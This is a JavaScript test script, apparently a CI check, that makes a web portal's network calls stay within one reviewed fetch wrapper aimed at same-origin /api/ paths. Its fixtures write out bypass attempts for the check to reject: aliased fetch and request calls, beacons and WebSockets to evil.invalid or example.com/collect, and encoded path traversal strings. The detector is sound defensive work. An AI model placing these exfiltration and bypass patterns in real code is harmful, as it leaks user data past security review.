import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const portalPath = "zbrowse/gateway/public/app.js";

function quotedLeadingArgumentCalls(source, calleePattern) {
  const matches = [];
  const pattern = new RegExp(
    "\\b" + calleePattern + "\\s*\\(\\s*([\\\"'])([^\\\"']*?)\\1",
    "g"
  );

  for (const match of source.matchAll(pattern)) {
    matches.push({ argument: match[2], index: match.index });
  }
  return matches;
}

// Prefix checks alone permit "/api/../other": browsers normalize it to
// "/other" before any request is sent. Bind each literal to its effective URL.
function isCanonicalApiLiteral(literal) {
  if (!literal.startsWith("/api/")) return false;
  // No current portal API endpoint needs encoded path syntax. Fail closed on
  // percent escapes (including double-encoded traversal and encoded controls).
  if (/[?#\\]/.test(literal) || literal.includes("%")) return false;
  try {
    const parsed = new URL(literal, "https://zbrowse.invalid");
    return parsed.origin === "https://zbrowse.invalid" &&
      parsed.pathname === literal && parsed.pathname.startsWith("/api/");
  } catch {
    return false;
  }
}

for (const pathLiteral of ["/api/health", "/api/session/", "/api/v1/health"]) {
  assert.equal(isCanonicalApiLiteral(pathLiteral), true, `${pathLiteral}: safe API literal`);
}
for (const pathLiteral of [
  "/api/../private", "/api/%2e%2e/private", "/api/x/../private",
  "/api/%2f%2fexample.test", "/api/%5cprivate",
  "/api/health?redirect=other", "/api/health#fragment",
  "/api/%00", "/api/%3fadmin", "/api/%252e%252e/private", "/api/%25",
  "/api/\\\\private", "/private", "//example.test/api/health"
]) {
  assert.equal(isCanonicalApiLiteral(pathLiteral), false, `${pathLiteral}: unsafe API literal`);
}

// Preserve every executable source token, including string literals and
// template expressions, but mask source comments before counting network
// references. Counting words in comments made safe portal documentation fail
// the CI boundary without corresponding executed JS. Keep mask lengths and
// line breaks so the existing literal /api route checks see unchanged code.
function withoutJavascriptComments(source) {
  let out = "";
  let mode = "code";
  let escaped = false;
  for (let i = 0; i < source.length; i++) {
    const c = source[i];
    const next = source[i + 1];
    if (mode === "line") {
      if (c === "\n" || c === "\r") {
        out += c;
        mode = "code";
      } else out += " ";
      continue;
    }
    if (mode === "block") {
      if (c === "*" && next === "/") {
        out += "  ";
        i++;
        mode = "code";
      } else out += c === "\n" || c === "\r" ? c : " ";
      continue;
    }
    if (mode !== "code") {
      out += c;
      if (escaped) escaped = false;
      else if (c === "\\") escaped = true;
      else if (c === mode) mode = "code";
      continue;
    }
    if (c === "/" && next === "/") {
      out += "  ";
      i++;
      mode = "line";
    } else if (c === "/" && next === "*") {
      out += "  ";
      i++;
      mode = "block";
    } else {
      out += c;
      if (c === "'" || c === '"' || c === "`") mode = c;
    }
  }
  return out;
}

function validatePortalNetworkBoundary(source, label) {
  const findings = [];
  const checkedSource = withoutJavascriptComments(source);

  const fetchCalls = [...checkedSource.matchAll(/\bfetch\s*\(/g)];
  if (fetchCalls.length !== 1) {
    findings.push(
      `${label}: must contain exactly one fetch() call inside the reviewed request() helper; found ${fetchCalls.length}`
    );
  }

  // A direct-call count alone misses aliases like const leak = window.fetch.
  // Permit only the single token of the reviewed wrapper's fetch() call.
  const fetchReferences = [...checkedSource.matchAll(/\bfetch\b/g)];
  if (fetchReferences.length !== fetchCalls.length) {
    findings.push(
      `${label}: indirect fetch references and aliases are forbidden; found ${fetchReferences.length} references for ${fetchCalls.length} direct calls`
    );
  }

  const helper = checkedSource.match(
    /async function request\(url, options = \{\}\) \{([\s\S]*?)\n\}/
  );
  if (!helper || !/\bfetch\s*\(\s*url\s*,/.test(helper[1])) {
    findings.push(
      `${label}: request() must remain the single direct fetch() wrapper and fetch its url argument`
    );
  }

  for (const primitive of ["XMLHttpRequest", "WebSocket", "EventSource"]) {
    if (new RegExp(`\\b${primitive}\\b`).test(checkedSource)) {
      findings.push(`${label}: unreviewed network primitive ${primitive} is forbidden even through aliases`);
    }
  }

  const requestInvocationCount =
    [...checkedSource.matchAll(/\brequest\s*\(/g)].length -
    [...checkedSource.matchAll(/\bfunction\s+request\s*\(/g)].length;
  const requestCalls = quotedLeadingArgumentCalls(checkedSource, "request");
  const requestDefinitionCount = [...checkedSource.matchAll(/\bfunction\s+request\s*\(/g)].length;
  const requestReferences = [...checkedSource.matchAll(/\brequest\b/g)].length;
  if (requestReferences !== requestInvocationCount + requestDefinitionCount) {
    findings.push(
      `${label}: indirect request() references, aliases and computed calls are forbidden`
    );
  }

  if (requestCalls.length !== requestInvocationCount) {
    findings.push(
      `${label}: every request() call must begin with a literal same-origin /api/ path`
    );
  }

  for (const call of requestCalls) {
    if (!isCanonicalApiLiteral(call.argument)) {
      findings.push(
        `${label}: request() target must remain a canonical same-origin /api/ path; got ${JSON.stringify(call.argument)}`
      );
    }
  }

  const beaconInvocationCount = [...checkedSource.matchAll(/\bnavigator\.sendBeacon\s*\(/g)].length;
  const beaconCalls = quotedLeadingArgumentCalls(checkedSource, "navigator\\.sendBeacon");
  const beaconReferences = [...checkedSource.matchAll(/\bsendBeacon\b/g)].length;
  if (beaconReferences !== beaconInvocationCount) {
    findings.push(
      `${label}: indirect sendBeacon access or alias is forbidden`
    );
  }


  if (beaconCalls.length !== beaconInvocationCount) {
    findings.push(
      `${label}: every navigator.sendBeacon() call must begin with a literal same-origin /api/ path`
    );
  }

  for (const call of beaconCalls) {
    if (!isCanonicalApiLiteral(call.argument)) {
      findings.push(
        `${label}: sendBeacon target must remain a canonical same-origin /api/ path; got ${JSON.stringify(call.argument)}`
      );
    }
  }

  return findings;
}

const safeFixture = `
async function request(url, options = {}) {
  const response = await fetch(url, options);
  return response;
}
request("/api/health");
request("/api/session/" + token + "/heartbeat");
navigator.sendBeacon("/api/session/" + token + "/heartbeat", "{}");
`;
assert.deepEqual(
  validatePortalNetworkBoundary(safeFixture, "safe fixture"),
  [],
  "safe same-origin API calls must remain allowed"
);

// Comments are not executable network accesses. The scanner must handle
// inline/block documentation while retaining all dangerous tokens in actual
// code, strings and computed network primitive aliases.
const safeWithComments = safeFixture +
  '\n// window.fetch and request(\"https://evil.invalid/\") are examples only\n' +
  '/* const leak = request; navigator.sendBeacon(\"//evil.invalid\"); */\n' +
  'request(\"/api/health\"); // request is documented, not aliased\n';
assert.deepEqual(validatePortalNetworkBoundary(safeWithComments, "comment fixture"), [],
  "comments must not cause false positives in a locked-down portal");
assert.equal(withoutJavascriptComments('const url = \"https://example.invalid/path\";')
  .includes('https://example.invalid/path'), true,
  "HTTPS URL strings must not be mistaken for source line comments");
for (const [description, appended] of [
  ['fetch alias after comments', 'const bypass = window.fetch;'],
  ['computed fetch alias after comments', 'window[\"fetch\"](\"https://evil.invalid/\");'],
  ['request alias after comments', 'const leak = request;'],
  ['new cross-origin direct request', 'request(\"https://evil.invalid/\");'],
  ['socket after comments', 'new WebSocket(\"wss://evil.invalid\");']
]) {
  const findings = validatePortalNetworkBoundary(safeWithComments + appended,
    description);
  assert.ok(findings.length > 0, description + ": executable bypass must remain denied");
}

for (const [name, source, expected] of [
  [
    "external request",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("https://example.com/collect");
`,
    /same-origin \/api\//
  ],
  [
    "nonliteral request",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request(targetUrl);
`,
    /literal same-origin/
  ],
  [
    "direct fetch",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
fetch("/api/extra");
`,
    /exactly one fetch/
  ],
  [
    "websocket",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
new WebSocket("wss://example.com/socket");
`,
    /WebSocket/
  ],
  [
    "external beacon",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
navigator.sendBeacon("//example.com/collect", "{}");
`,
    /sendBeacon target/
  ],
  [
    "fetch alias alongside approved wrapper",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
const leak = window.fetch;
leak("https://example.com/collect");
`,
    /indirect fetch references/
  ],
  [
    "computed fetch property alongside approved wrapper",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
window["fetch"]("https://example.com/collect");
`,
    /indirect fetch references/
  ],
  [
    "constructor alias",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
const Socket = window.WebSocket;
new Socket("wss://example.com/socket");
`,
    /unreviewed network primitive WebSocket/
  ],
  [
    "normalized traversal request",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/%2e%2e/other");
`,
    /canonical same-origin \/api\//
  ],
  [
    "normalized traversal beacon",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
navigator.sendBeacon("/api/../other", "{}");
`,
    /canonical same-origin \/api\//
  ],
  [
    "request variable alias",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
const outbound = request;
outbound("https://example.com/collect");
`,
    /indirect request/
  ],
  [
    "computed request call",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
window["request"]("https://example.com/collect");
`,
    /indirect request/
  ],
  [
    "optional request call",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request?.("https://example.com/collect");
`,
    /indirect request/
  ],
  [
    "double encoded API traversal",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/%252e%252e/private");
`,
    /canonical same-origin/
  ],
  [
    "beacon alias",
    `async function request(url, options = {}) {
  return fetch(url, options);
}
request("/api/health");
const beacon = navigator["sendBeacon"];
beacon("https://example.com/collect", "{}");
`,
    /indirect sendBeacon/
  ]
]) {
  const findings = validatePortalNetworkBoundary(source, name);
  assert.ok(
    findings.some((finding) => expected.test(finding)),
    `${name} self-test failed:\n${findings.join("\n")}`
  );
}

const portal = fs.readFileSync(path.join(root, portalPath), "utf8");
const findings = validatePortalNetworkBoundary(portal, portalPath);

assert.deepEqual(
  findings,
  [],
  `zBrowse portal network boundary failed:\n${findings.join("\n")}`
);

console.log("zBrowse portal same-origin network boundary passed");
